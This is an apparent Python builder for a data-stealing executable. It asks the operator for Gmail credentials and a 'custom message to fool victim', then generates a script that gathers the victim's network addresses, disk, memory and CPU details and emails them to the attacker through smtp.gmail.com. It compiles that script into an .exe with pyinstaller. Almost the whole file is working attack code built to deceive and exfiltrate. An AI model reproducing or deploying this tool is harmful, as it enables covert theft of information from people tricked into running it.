import os
import platform

from getpass import getpass
from colorama import Fore
from time import sleep


B = Fore.BLUE
R = Fore.RED
W = Fore.LIGHTWHITE_EX
Y = Fore.YELLOW
C = Fore.CYAN
G = Fore.GREEN



def command(str):
    os.system(str)

def colors(str):
    return f"\n{W}[{B}</>{W}] {str}"

command("cls") if 'Windows' in platform.platform() else command("clear")


def genertor():
    mail = input(f"{C}[-]{Y} Enter Gmail id: " + W)

    paswd = getpass(f"{Y}[{R}?{Y}] Password: ")

    custom_msg = input(f"{Y}[{C}>{Y}] Type custom message to fool victim: " + W)

    per = 0

    while per != 101:
        string = f"{Y} <{R}/{Y}> {W}Preparing...\t" + C + str(per) + "%"
        sleep(0.1)
        print(string , end="\r")

        per += 1



    script = """import psutil

import os
from colorama import Fore


B = Fore.BLUE
R = Fore.RED
W = Fore.LIGHTWHITE_EX
Y = Fore.YELLOW
C = Fore.CYAN
G = Fore.GREEN



def check():
    fi = "Data.txt"
    if os.path.exists(fi):
        os.remove(fi)
    else:
        pass


check()

file = open("Data.txt", "a+")


def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


file.write('\\n' + "=" * 40 + "Network Information" + "=" * 40)
# get all network interfaces (virtual and physical)
if_addrs = psutil.net_if_addrs()
for interface_name, interface_addresses in if_addrs.items():
    for address in interface_addresses:
        file.write(f"\\n=== Interface: {interface_name} ===")
        if str(address.family) == 'AddressFamily.AF_INET':
            file.write(f"\\n  IP Address: {address.address}")
            file.write(f"\\n  Netmask: {address.netmask}")
            file.write(f"\\n  Broadcast IP: {address.broadcast}")
        elif str(address.family) == '\\nAddressFamily.AF_PACKET':
            file.write(f"\\n  MAC Address: {address.address}")
            file.write(f"\\n  Netmask: {address.netmask}")
            file.write(f"\\n  Broadcast MAC: {address.broadcast}")
# get IO statistics since boot
net_io = psutil.net_io_counters()
file.write(f"\\nTotal Bytes Sent: {get_size(net_io.bytes_sent)}")
file.write(f"\\nTotal Bytes Received: {get_size(net_io.bytes_recv)}")

# Disk Information
file.write('\\n' + "=" * 40 + "Disk Information" + "=" * 40)
file.write("\\nPartitions and Usage:")
# get all disk partitions
partitions = psutil.disk_partitions()
for partition in partitions:
    file.write(f"\\n=== Device: {partition.device} ===")
    file.write(f"\\n  Mountpoint: {partition.mountpoint}")
    file.write(f"\\n  File system type: {partition.fstype}")
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:
        # this can be catched due to the disk that
        # isn't ready
        continue
    file.write(f"\\n  Total Size: {get_size(partition_usage.total)}")
    file.write(f"\\n  Used: {get_size(partition_usage.used)}")
    file.write(f"\\n  Free: {get_size(partition_usage.free)}")
    file.write(f"\\n  Percentage: {partition_usage.percent}%")
# get IO statistics since boot
disk_io = psutil.disk_io_counters()
file.write(f"\\nTotal read: {get_size(disk_io.read_bytes)}")
file.write(f"\\nTotal write: {get_size(disk_io.write_bytes)}")

# Memory Information
file.write('\\n' + "=" * 40 + "Memory Information" + "=" * 40)
# get the memory details
svmem = psutil.virtual_memory()
file.write(f"\\nTotal: {get_size(svmem.total)}")
file.write(f"\\nAvailable: {get_size(svmem.available)}")
file.write(f"\\nUsed: {get_size(svmem.used)}")
file.write(f"\\nPercentage: {svmem.percent}%")
file.write('\\n' + "=" * 20 + "SWAP" + "=" * 20)
# get the swap memory details (if exists)
swap = psutil.swap_memory()
file.write(f"\\nTotal: {get_size(swap.total)}")
file.write(f"\\nFree: {get_size(swap.free)}")
file.write(f"\\nUsed: {get_size(swap.used)}")
file.write(f"\\nPercentage: {swap.percent}%")

# let's file.write CPU information
file.write("=" * 40 + "CPU Info" + "=" * 40)
# number of cores
file.write(f"\\nPhysical cores: {psutil.cpu_count(logical=False)}")
file.write(f"\\nTotal cores: {psutil.cpu_count(logical=True)}")
# CPU frequencies
cpufreq = psutil.cpu_freq()
file.write(f"\\nMax Frequency: {cpufreq.max:.2f}Mhz")
file.write(f"\\nMin Frequency: {cpufreq.min:.2f}Mhz")
file.write(f"\\nCurrent Frequency: {cpufreq.current:.2f}Mhz")
# CPU usage
file.write("\\nCPU Usage Per Core:")
for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
    file.write(f"\\nCore {i}: {percentage}%")
file.write(f"\\nTotal CPU Usage: {psutil.cpu_percent()}%")

# Boot Time
file.close()

import smtplib


def start():
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login("__mail", "__password")

    with open("data.txt", "r") as r:
        msg = r.read()

    server.sendmail("__mail", "__mail", msg)


start()
print("\\t__custom_message")

if os.path.exists("data.txt"):
    os.remove("data.txt")
    

input("[\\t[+] Press enter to exit")
"""

    script = script.replace("__mail" , mail)
    script = script.replace("__password" , paswd)
    script = script.replace("__custom_message" , custom_msg)


    if os.path.exists("generator.py"):
        os.remove("generator.py")


    with open("generator.py" , "a+") as f:
        f.write(script)

        print(colors("Generated! \n\n\n"))

    print(colors("Creating .exe..."))

    command("pyinstaller generator.py --onefile")
    input(C + "\n\tPress enter to exit! ")

genertor()




